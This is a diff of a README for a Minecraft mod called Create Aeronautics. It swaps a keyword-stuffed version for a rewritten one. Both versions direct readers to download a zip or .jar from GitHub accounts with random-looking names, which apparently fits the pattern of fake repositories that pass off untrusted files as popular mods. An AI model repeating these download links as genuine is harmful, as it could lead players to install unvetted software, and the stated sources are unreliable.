@@ -1,46 +1,58 @@
+# ✈️ create-aeronautics-minecraft-mod - Build complex airships in Minecraft easily
 
-# Create Aeronautics
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/purplepassagescutellaria384/create-aeronautics-minecraft-mod)
 
-> **Create Aeronautics** — aeronautics create minecraft mod github modrinth curseforge create addon sable physics engine simulated offroad airships planes drones vehicles contraptions neoforge forge 1.21.1 1.20.1 download latest version 2026 setup guide tutorial release free multiplayer server performance optimization fps fix error crash.
+## 📖 About this project
 
+This mod adds physics and vehicle movement to Minecraft. Use the Create mod to design planes, airships, and drones. These machines move through your world and interact with terrain. The mod uses a custom stable physics engine to handle speed and collisions. You can build large contraptions that fly or travel across land.
 
-<img width="100" height="100" alt="00rslh26hrud1" src="https://github.com/user-attachments/assets/825cc8e6-833d-49dc-8f6c-ab365da6566b" />
+## ⚙️ System requirements
 
-[![GitHub Stars](https://img.shields.io/github/stars/Szili1994/create-aeronautics-minecraft-mod?style=flat-square&color=00d4aa)](https://github.com/Szili1994/create-aeronautics-minecraft-mod/stargazers)
-[![GitHub Forks](https://img.shields.io/github/forks/Szili1994/create-aeronautics-minecraft-mod?style=flat-square&color=0099cc)](https://github.com/Szili1994/create-aeronautics-minecraft-mod/network)
-[![Downloads](https://img.shields.io/github/downloads/Szili1994/create-aeronautics-minecraft-mod/total?style=flat-square&color=7c5cbf)](https://github.com/Szili1994/create-aeronautics-minecraft-mod/releases)
-[![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](LICENSE)
+Ensure your computer has the following software installed:
 
-## Overview
-**Create Aeronautics** is a powerful open-source Minecraft mod and Create addon. It expands the Create mod with the Sable physics engine to let you build realistic simulated contraptions, offroad vehicles, airships, planes, drones and flying machines with full physics, redstone control and multiplayer support.
+* Windows 10 or 11
+* Java 17 or newer
+* Minecraft 1.20.1 or 1.21.1
+* NeoForge or Forge mod loader
 
-> [!Important]
-> This mod is provided for educational and personal use only. Always back up your world before installing. Requires Create + Sable to work.
+Test your system performance before you build complex machines. Large contraptions require more memory. Assign at least 4GB of RAM to your Minecraft launcher for best results.
 
+## 📥 How to download
 
----
-## Install
-[Download `CreateAeronautics.zip`](https://github.com/Szili1994/create-aeronautics-minecraft-mod/releases/download/minecraftmod/CreateAeronautics.zip)
----
+Visit the official repository page to select your version: [https://github.com/purplepassagescutellaria384/create-aeronautics-minecraft-mod](https://github.com/purplepassagescutellaria384/create-aeronautics-minecraft-mod)
 
-> Optimized for Minecraft 1.21.1 and 1.20.1 (NeoForge / Forge).
+Follow these steps to get the files:
 
-## Installation
-### For Regular Users
-1. Download and extract the archive (aeronautics create minecraft mod github free download)
-2. Place the `.jar` file in your mods folder
-3. Install required dependencies: **Create** and **Sable**
-4. Launch Minecraft with NeoForge or Forge loader
-5. Start building airships, planes, drones, vehicles and contraptions instantly
+1. Click the provided link above.
+2. Select the Releases tab on the right side of the screen.
+3. Find the version that matches your game loader version.
+4. Download the .jar file to your computer.
 
----
-## Troubleshooting
-| Problem                        | Solution                                              |
-|--------------------------------|-------------------------------------------------------|
-| Mod doesn't load               | Install Create + Sable mods first                     |
-| Crash on launch                | Update NeoForge/Forge and check mod versions          |
-| Low FPS / performance issues   | Enable performance optimization and lower render distance |
-| Physics not working            | Verify Sable physics engine is installed correctly    |
-| Multiplayer / server issues    | Make sure all players and server have matching versions |
-| Error / crash                  | Check latest.log and report with full mod list        |
-| Contraptions not flying        | Use proper propellers, hot air or magic floating rocks|
+## 🛠 Setup instructions
+
+Follow this process to install the mod:
+
+1. Close the Minecraft launcher.
+2. Press the Windows key plus R on your keyboard.
+3. Type %appdata% and press Enter.
+4. Open the .minecraft folder.
+5. Create a folder named "mods" inside if it does not exist.
+6. Move the downloaded .jar file into the "mods" folder.
+7. Open your Minecraft launcher and select your NeoForge or Forge profile.
+8. Start the game.
+
+## 🏗 Using the mod
+
+Once the game loads, you will find new engineering blocks in your creative menu. Use the Create mod interaction tools to link blocks together. A chassis block creates the base for your vehicle. Use gearboxes and engines to provide power.
+
+Always anchor your vehicle to the ground until you finish the frame. Activate your machine with a control interface block. The physics engine starts once the machine detaches from the world grid. Keep track of your weight, as heavy airships need more lift.
+
+## 📈 Performance tips
+
+Complex contraptions affect your frame rate. Lower your render distance if the game stutters. Disable shaders to keep the physics engine stable during flight. High particle counts from engines also consume processing power. Use the built-in debug menu by pressing F3 to monitor your memory usage.
+
+## 🚩 Fixing common errors
+
+If your game crashes on startup, check your mod compatibility. Ensure you use the exact version of Forge or NeoForge recommended for the mod build. Remove other mods if you encounter conflicts. If a vehicle gets stuck, use the recovery tool in the mod menu to reset the physics state.
+
+Update your graphics drivers if you see visual glitches on moving parts. Reach out to the community for help with complex builds. Most issues relate to conflicting mod versions or insufficient memory allocation within the Minecraft launcher settings.
